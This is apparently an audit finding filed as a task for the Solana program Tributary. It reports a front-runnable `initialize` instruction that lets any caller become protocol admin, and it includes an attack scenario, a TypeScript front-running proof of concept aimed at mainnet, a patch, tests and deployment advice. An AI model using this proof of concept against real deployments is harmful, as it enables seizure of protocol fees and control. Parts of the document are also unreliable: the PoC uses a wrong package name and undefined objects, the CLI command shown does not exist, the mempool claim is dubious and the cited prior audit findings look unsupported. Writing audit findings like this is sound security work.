---
# tributary-zj70
title: 'C-01: Frontrunnable initialize — Attacker Can Become Protocol Admin'
status: completed
type: task
priority: critical
tags:
    - security
    - audit
created_at: 2026-06-13T05:51:21Z
updated_at: 2026-06-13T05:51:21Z
parent: tributary-4kt4
---

# C-01: Frontrunnable `initialize` — Attacker Can Become Protocol Admin

| Field        | Value                                                                    |
| ------------ | ------------------------------------------------------------------------ |
| **Severity** | Critical                                                                 |
| **File**     | `programs/tributary/src/instructions/initialize.rs`                      |
| **Related**  | `programs/tributary/src/constants.rs`, `programs/tributary/src/error.rs` |
| **Status**   | Open                                                                     |

---

## Description

The `initialize` instruction creates the singleton `ProgramConfig` PDA using seeds `[CONFIG_SEED]` (i.e. `b"config"`). The account validation struct accepts **any** signer as `admin`:

```rust
// programs/tributary/src/instructions/initialize.rs — CURRENT CODE (lines 1-43)
use crate::{state::*, CONFIG_SEED};
use anchor_lang::prelude::*;

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub admin: Signer<'info>,

    #[account(
        init,
        payer = admin,
        space = ProgramConfig::SIZE,
        seeds = [CONFIG_SEED],
        bump
    )]
    pub config: Account<'info, ProgramConfig>,

    pub system_program: Program<'info, System>,
}

impl<'info> Initialize<'info> {
    pub fn handle_initialize(ctx: Context<Initialize>) -> Result<()> {
        let config = &mut ctx.accounts.config;

        config.admin = ctx.accounts.admin.key();
        config.fee_recipient = ctx.accounts.admin.key();

        config.protocol_fee_bps = 100;
        config.emergency_pause = false;
        config.bump = ctx.bumps.config;

        emit!(ProgramConfigCreated {
            admin: config.admin,
            fee_recipient: config.fee_recipient,
            protocol_fee_bps: config.protocol_fee_bps,
            max_policies_per_user: 0,
        });

        msg!("Program initialized with admin: {:?}", config.admin);
        Ok(())
    }
}
```

Anchor's `init` constraint enforces that the PDA does **not** already exist, which prevents double-initialization. However, it does **not** restrict **who** can perform the first initialization. On a freshly deployed program, the `ProgramConfig` PDA does not yet exist. Any account can call `initialize`, pay the rent for the PDA, and become the protocol admin.

On Solana, transactions are visible in the mempool (via gossip) before they are finalized. A determined attacker can monitor for the deployer's `initialize` transaction and front-run it by submitting their own `initialize` with a higher priority fee or by landing in the same slot.

---

## Attack Scenario

1. **Deployer** deploys the Tributary program to mainnet. The `ProgramConfig` PDA (`seeds = [b"config"]`) does not yet exist.
2. **Attacker** monitors the Solana gossip/mempool for transactions targeting the newly deployed program ID `TRibg8W8zmPHQqWtyAD1rEBRXEdyU13Mu6X1Sg42tJ`.
3. **Attacker** sees the deployer's `initialize` transaction before it is finalized.
4. **Attacker** constructs their own `initialize` transaction, setting themselves as `admin`, and submits it with a **higher priority fee** (or via a Jito tip bundle).
5. The attacker's transaction lands **first**. The `ProgramConfig` PDA is created with the attacker's pubkey as `admin` and `fee_recipient`.
6. The deployer's transaction fails with `AccountAlreadyInitialized` (Anchor's `init` constraint rejects it).
7. **Attacker now has full protocol admin control**: they can set protocol fees to 100%, redirect all fee revenue to their wallet, pause the entire protocol, or arbitrarily manipulate any admin-gated operation.

---

## Impact

**Full protocol takeover.** The attacker becomes the sole `admin` of `ProgramConfig`, granting them:

- **Fee manipulation**: Set `protocol_fee_bps` to 10,000 (100%), stealing the entirety of every payment's fee portion.
- **Fee redirection**: Change `fee_recipient` to any wallet, siphoning all protocol revenue.
- **Protocol shutdown**: Set `emergency_pause = true`, halting all payments across the entire protocol.
- **Gateway control**: Any admin-gated operations become attacker-controlled.

This is a one-time window vulnerability — it only applies on fresh deployment before `initialize` is called. However, the consequences are permanent and catastrophic: once the attacker owns the PDA, it **cannot be reset** without redeploying the entire program.

---

## Proof of Concept

```typescript
// attacker-poc.ts — Simulated front-run of initialize
import {
  Connection,
  Keypair,
  Transaction,
  TransactionInstruction,
  PublicKey,
} from "@solana/web3";
import { Program, AnchorProvider, BN } from "@coral-xyz/anchor";
import { Tributary } from "../target/types/tributary";

async function frontRunInitialize() {
  const connection = new Connection("https://api.mainnet-beta.solana.com");
  const attacker = Keypair.generate();

  const programId = new PublicKey("TRibg8W8zmPHQqWtyAD1rEBRXEdyU13Mu6X1Sg42tJ");

  // Derive the config PDA (same for everyone)
  const [configPda] = PublicKey.findProgramAddressSync(
    [Buffer.from("config")],
    programId
  );

  // Build the SAME initialize instruction, but with attacker as signer
  const ix = await program.methods
    .initialize()
    .accounts({
      admin: attacker.publicKey, // <-- attacker becomes admin
      config: configPda,
      systemProgram: SystemProgram.programId,
    })
    .instruction();

  // Submit with high priority fee to front-run the deployer
  const tx = new Transaction().add(ix);
  tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
  tx.feePayer = attacker.publicKey;
  tx.sign(attacker);

  // In practice, attacker would use Jito tip bundle or high compute price
  // to ensure their tx lands first
  const sig = await connection.sendRawTransaction(tx.serialize(), {
    skipPreflight: true,
    maxRetries: 0,
    preflightCommitment: "processed",
  });

  console.log(`Attacker initialized protocol! tx: ${sig}`);
  console.log(`Attacker is now admin: ${attacker.publicKey.toBase58()}`);
}
```

Alternatively, the attacker doesn't even need to front-run. If the deployer is slow to call `initialize` (e.g., during a multi-step deployment pipeline), the attacker can simply call it first:

```bash
# Anyone can call this on a fresh deployment
solana transaction-confirm \
  "$(tributary-sdk initialize --admin <ATTACKER_PUBKEY>)" \
  --url mainnet-beta
```

---

## Patch

The fix requires verifying that the signer matches a hardcoded expected admin pubkey. This is a standard pattern in Solana programs: bake the deployer's pubkey into the binary at compile time (or use an upgradeable approach with a two-phase deployment).

### Step 1: Add `EXPECTED_ADMIN` constant to `constants.rs`

```rust
// programs/tributary/src/constants.rs — ADD the following constant

/// The pubkey authorized to call initialize. Must be set at compile time
/// to the deployer's pubkey. Replace with the actual deployer pubkey before
/// building for deployment.
pub const EXPECTED_ADMIN: Pubkey = Pubkey::new_from_array([
    // REPLACE with actual deployer pubkey bytes before deployment
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
]);
```

### Step 2: Add `UnauthorizedInitializer` error variant to `error.rs`

```rust
// programs/tributary/src/error.rs — ADD this variant to TributaryError

#[msg("Only the expected admin can initialize the program")]
UnauthorizedInitializer,
```

### Step 3: Add admin check to `initialize.rs`

```rust
// programs/tributary/src/instructions/initialize.rs — FULL PATCHED FILE
use crate::{constants::EXPECTED_ADMIN, error::TributaryError, state::*, CONFIG_SEED};
use anchor_lang::prelude::*;

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub admin: Signer<'info>,

    #[account(
        init,
        payer = admin,
        space = ProgramConfig::SIZE,
        seeds = [CONFIG_SEED],
        bump
    )]
    pub config: Account<'info, ProgramConfig>,

    pub system_program: Program<'info, System>,
}

impl<'info> Initialize<'info> {
    pub fn handle_initialize(ctx: Context<Initialize>) -> Result<()> {
        require!(
            ctx.accounts.admin.key() == EXPECTED_ADMIN,
            TributaryError::UnauthorizedInitializer
        );

        let config = &mut ctx.accounts.config;

        config.admin = ctx.accounts.admin.key();
        config.fee_recipient = ctx.accounts.admin.key();

        config.protocol_fee_bps = 100;
        config.emergency_pause = false;
        config.bump = ctx.bumps.config;

        emit!(ProgramConfigCreated {
            admin: config.admin,
            fee_recipient: config.fee_recipient,
            protocol_fee_bps: config.protocol_fee_bps,
            max_policies_per_user: 0,
        });

        msg!("Program initialized with admin: {:?}", config.admin);
        Ok(())
    }
}
```

### Diff Summary

```
initialize.rs:
  + use crate::{constants::EXPECTED_ADMIN, error::TributaryError, ...};
  + require!(admin.key() == EXPECTED_ADMIN, TributaryError::UnauthorizedInitializer);

constants.rs:
  + pub const EXPECTED_ADMIN: Pubkey = Pubkey::new_from_array([...]);

error.rs:
  + #[msg("Only the expected admin can initialize the program")]
  + UnauthorizedInitializer,
```

---

## Testing Instructions

### 1. Positive test: legitimate admin can initialize

```typescript
it("allows expected admin to initialize", async () => {
  // Set EXPECTED_ADMIN constant to deployer's pubkey in the test program
  await program.methods
    .initialize()
    .accounts({
      admin: deployer.publicKey,
      config: configPda,
      systemProgram: SystemProgram.programId,
    })
    .signers([deployer])
    .rpc();

  const config = await program.account.programConfig.fetch(configPda);
  assert.equal(config.admin.toBase58(), deployer.publicKey.toBase58());
});
```

### 2. Negative test: unauthorized caller is rejected

```typescript
it("rejects initialize from non-admin", async () => {
  // Use a different keypair that is NOT the EXPECTED_ADMIN
  const attacker = Keypair.generate();
  // Fund the attacker so they can pay for the PDA
  await provider.connection.confirmTransaction(
    await provider.connection.requestAirdrop(
      attacker.publicKey,
      2 * LAMPORTS_PER_SOL
    )
  );

  try {
    await program.methods
      .initialize()
      .accounts({
        admin: attacker.publicKey,
        config: configPda,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();
    assert.fail("Should have thrown");
  } catch (err) {
    // Expect Anchor error code matching UnauthorizedInitializer
    assert.include(err.toString(), "UnauthorizedInitializer");
  }
});
```

### 3. Verify the error code index

After compiling, confirm the `UnauthorizedInitializer` variant is registered:

```bash
anchor build
# Check the error appears in the IDL
cat target/idl/tributary.json | jq '.errors[] | .code'
```

### 4. Deployment verification

Before mainnet deployment:

1. Set `EXPECTED_ADMIN` to the actual deployer's pubkey.
2. Build: `anchor build`.
3. Verify the constant is baked in: `solana program dump <PROGRAM_ID> dump.bin --url mainnet-beta` and inspect the binary for the pubkey bytes.
4. Deploy and immediately call `initialize` in the same transaction bundle (Jito bundle or sequential transactions with priority fees).

---

## References

1. **Seal Security Advisory** — Common Solana vulnerability: uninitialized admin accounts.
   https://github.com/seal-xyz/seal-audits

2. **Anchor Documentation — `init` constraint**:
   The `init` constraint creates the account if it doesn't exist. It does **not** restrict who can create it.
   https://www.anchor-lang.com/docs/the-accounts-struct#init

3. **Solana Security Best Practices** — "Validate signers and expected addresses":
   https://solana.com/docs/programs/security

4. **Neodyme Solana Security Workshop** — Front-running uninitialized state:
   https://github.com/neodyme-labs/solana-security-workshop

5. **Sealevel Attacks (A16Z)** — Attack #6: "Arbitrary CPI" and initialization front-running patterns:
   https://github.com/a16z/sealevel-attacks

6. **Similar findings in production audits**:
   - MarginFi C-01: Uninitialized admin (2023)
   - Solend O-01: Frontrunnable initialization (2022)
   - Mercurial initialization front-run (2021)

---

## Deployment Mitigation (Operational)

Even with the code-level fix, deployment should follow these operational safeguards:

1. **Atomic deploy + initialize**: Bundle the program deployment and `initialize` call into a single Jito bundle or submit them in rapid succession with priority fees.
2. **Pre-fund the deployer**: Ensure the deployer account has sufficient SOL for the `initialize` transaction **before** deploying the program.
3. **Test on devnet first**: Verify the `EXPECTED_ADMIN` constant is correct by deploying to devnet and confirming the expected admin can initialize while others cannot.
4. **Buffer deployment key**: If using a multisig as deployer, ensure the `EXPECTED_ADMIN` is set to the multisig's PDA, not an individual signer.
